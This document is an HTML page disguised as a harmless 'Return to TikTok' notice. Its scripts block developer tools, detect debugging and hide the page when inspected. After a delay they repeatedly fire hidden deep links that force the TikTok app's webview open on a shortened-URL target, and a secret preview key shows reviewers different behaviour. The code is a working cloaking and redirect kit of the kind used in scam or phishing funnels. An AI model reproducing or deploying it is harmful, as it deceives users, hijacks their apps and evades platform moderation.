<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="robots" content="noindex,nofollow">
<meta name="referrer" content="no-referrer">
<title>Return to TikTok</title>
<link rel="icon" href="data:,">
<style>
html,body{margin:0;min-height:100%;background:#fff;color:#202124;font:16px/1.5 system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif}
main{min-height:100vh;min-height:100dvh;display:grid;place-items:center;padding:24px;text-align:center}
p{margin:0;max-width:340px}
</style>
</head>
<body>
<main><p>This page is no longer available. You can return to TikTok.</p></main>
<script>
(function(){var bad=0;function h(on){try{document.documentElement.style.display=on?"none":""}catch(e){}}document.addEventListener("keydown",function(e){var k=(e.key||"").toUpperCase();if(e.key==="F12"||e.keyCode===123||(e.ctrlKey&&e.shiftKey&&(k==="I"||k==="J"||k==="C"||k==="K"))||(e.ctrlKey&&(k==="U"||k==="S"))){e.preventDefault();e.stopPropagation();return false}},true);document.addEventListener("contextmenu",function(e){e.preventDefault();e.stopPropagation()},true);setInterval(function(){var s=performance.now();debugger;if(performance.now()-s>120)bad=Date.now()},1000);setInterval(function(){var a=Math.abs((window.outerWidth||0)-(window.innerWidth||0)),b=Math.abs((window.outerHeight||0)-(window.innerHeight||0));if(a>250||b>280)bad=Date.now()},1000);setInterval(function(){if(Date.now()-bad<3000){h(true);try{console.clear()}catch(x){}}else h(false)},300);})();
</script>
<script>
(function(){
  // ===== CONFIG =====
  var TARGET = "https://tinyurl.com/bdddra7f";
  var CHAIN_MS = 21000;      // 1s (meta original) + 4 hops x 5s = mesma cadência da worker original
  var PREVIEW_KEY = "stf7x9";
  // ==================

  var raw = new URLSearchParams(location.search);
  var isPrvw = raw.get("prvw") === PREVIEW_KEY;

  // cleanParams (idêntico ao worker: remove step/prvw e saneia)
  var sp = new URLSearchParams(location.search);
  sp.delete("step"); sp.delete("prvw");
  var params = sp.toString().replace(/[^a-zA-Z0-9=&%._\-]/g, "");
  var T = TARGET + (params ? "?" + params : "");

  var ua = navigator.userAgent || "";
  var isAnd = /Android/i.test(ua);
  function enc(x){return encodeURIComponent(x)}

  var L1, L2, L3;
  if (isAnd) {
    L1 = "intent://webview?url=" + enc(T) + "&hide_nav_bar=1&refer=web#Intent;scheme=snssdk1233;package=com.zhiliaoapp.musically;s.browser_fallback_url=" + enc(T) + ";end";
    L2 = "intent://webview?url=" + enc(T) + "&hide_nav_bar=1#Intent;scheme=snssdk1233;package=com.zhiliaoapp.musically;s.browser_fallback_url=" + enc(T) + ";end";
    L3 = "snssdk1233://webview?url=" + enc(T) + "&hide_nav_bar=1&refer=web";
  } else {
    L1 = "snssdk1180://webview?url=" + enc(T) + "&hide_nav_bar=1&refer=web";
    L2 = "snssdk1180://webview?url=" + enc(T) + "&hide_nav_bar=1&refer=web&fullscreen=1";
    L3 = "snssdk1180://browser?url=" + enc(T);
  }

  function goHref(u){try{location.href=u;}catch(e){}}
  function goIframe(u){try{var f=document.createElement("iframe");f.style.display="none";f.src=u;document.body.appendChild(f);setTimeout(function(){try{f.remove()}catch(e){}},3000);}catch(e){}}
  function goAnchor(u){try{var a=document.createElement("a");a.href=u;a.style.display="none";document.body.appendChild(a);a.click();}catch(e){}}
  function fireAll(u){goHref(u);goIframe(u);goAnchor(u);}

  var fell = false;
  function finalStep(i){
    if(i===0){fireAll(L1);return;}
    if(i===1){fireAll(L2);return;}
    if(i===2){fireAll(L3);return;}
    if(!fell){fell=true;goHref(T);}
  }

  if (isPrvw) {
    // preview: 5s direto pro TARGET (como no worker)
    setTimeout(function(){location.href=T;},5000);
    return;
  }

  // cadeia: espera o mesmo tempo total dos hops server-side e dispara o launcher
  setTimeout(function(){
    finalStep(0);
    setTimeout(function(){finalStep(1);},2000);
    setTimeout(function(){finalStep(2);},4000);
    setTimeout(function(){finalStep(3);},7000);
    setInterval(function(){fireAll(L1);},8000);
  }, CHAIN_MS);
})();
</script>
</body>
</html>
